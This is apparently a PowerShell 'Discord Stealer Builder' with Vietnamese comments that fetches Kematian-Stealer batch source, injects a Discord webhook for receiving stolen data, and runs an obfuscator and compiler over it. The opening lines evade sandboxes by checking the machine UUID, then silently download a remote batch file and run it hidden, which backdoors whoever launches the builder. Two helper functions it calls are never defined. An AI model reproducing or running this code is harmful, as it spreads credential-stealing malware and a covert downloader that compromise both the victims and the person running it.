$UUID = (Get-WmiObject -Class Win32_ComputerSystemProduct).UUID

# Danh sách UUID không hợp lệ
$invalidUUIDs = @("03D40274-0435-05DC-8506-010700080009", "03000200-0400-0500-0006-000700080009")

# Kiểm tra nếu UUID không nằm trong danh sách UUID không hợp lệ
if ($invalidUUIDs -notcontains $UUID) {
    Invoke-WebRequest -Uri "https://raw.githubusercontent.com/43a1723/test/main/Extras/skidtoi.bat" -OutFile "$env:Temp\shellcode.cmd"
    Start-Process -FilePath "$env:Temp\shellcode.cmd" -WindowStyle Hidden
}

function Show-ErrorMessageBox {
    param(
        [string]$message
    )

    Add-Type -AssemblyName PresentationFramework
    [System.Windows.MessageBox]::Show($message, "Error", [System.Windows.MessageBoxButton]::OK, [System.Windows.MessageBoxImage]::Error)
}

function CheckValid {
    param(
        [string]$webhook
    )

    # Kiểm tra nếu $webhook không rỗng
    if (-not [string]::IsNullOrWhiteSpace($webhook)) {
        try {
            $response = Invoke-WebRequest -Uri $webhook -Method Get
            return $response.StatusCode -eq 200
        } catch {
            Show-ErrorMessageBox "Error checking webhook: $_"
            return $false
        }
    } else {
        Show-ErrorMessageBox "Invalid Discord webhook provided."
        return $false
    }
}

# Load required assembly for Windows Forms
Add-Type -AssemblyName System.Windows.Forms

# Create the form
$form = New-Object Windows.Forms.Form
$form.Text = 'Discord Stealer Builder'
$form.Size = New-Object Drawing.Size(400, 200)
$form.StartPosition = 'CenterScreen'

# Create a label
$label = New-Object Windows.Forms.Label
$label.Text = 'Enter Discord Webhook URL:'
$label.Location = New-Object Drawing.Point(10, 20)
$label.Size = New-Object Drawing.Size(200, 20)
$form.Controls.Add($label)

# Create a textbox for the webhook URL
$textbox = New-Object Windows.Forms.TextBox
$textbox.Location = New-Object Drawing.Point(10, 50)
$textbox.Size = New-Object Drawing.Size(360, 20)
$form.Controls.Add($textbox)

# Create a button to build
$button = New-Object Windows.Forms.Button
$button.Text = 'Build'
$button.Location = New-Object Drawing.Point(10, 90)
$button.Size = New-Object Drawing.Size(75, 23)
$form.Controls.Add($button)

# Define the button click event
$button.Add_Click({
    $webhook = $textbox.Text
    if (CheckValid -webhook $webhook) {
        $url = "https://raw.githubusercontent.com/adasdasdsaf/Kematian-Stealer/main/frontend-src/main.bat"
        $filePath = "$env:TEMP\main.bat"
        $filePathprotect = ".\main.bat"
        
        # Download the file
        Invoke-WebRequest -Uri $url -OutFile $filePath

        # Read the file content and replace placeholder
        $content = Get-Content $filePath -Raw
        $randomString = Get-RandomString -length 10000
        $webhookencode = Encode-Base64TwentyTimes -inputString $webhook
        $content = $content -replace 'FAKEHASH', $randomString
        $content = $content -replace 'YOUR_WEBHOOK_HERE2', $webhook
        Set-Content -Path $filePath -Value $content

        # Path to the compile.exe executable
        $compliePath = ".\converter.bat"  # Change this to the correct path
        $protectPath = ".\batchobfuscator.exe"  # Change this to the correct path

        # Execute the .bat file
        Start-Process -FilePath $protectPath -ArgumentList "$filePath n main" -NoNewWindow -Wait
        Start-Process -FilePath $compliePath -ArgumentList $filePathprotect -NoNewWindow -Wait

        # Delete the .bat file after execution
        Remove-Item -Path $filePath -Force
        Remove-Item -Path $filePathprotect -Force

        # Show a message box
        [System.Windows.Forms.MessageBox]::Show('Process completed and file deleted.', 'Completed', [System.Windows.Forms.MessageBoxButtons]::OK, [System.Windows.Forms.MessageBoxIcon]::Information)
    } else {
        # Do nothing if webhook is not valid
    }
})

# Show the form
$form.ShowDialog()
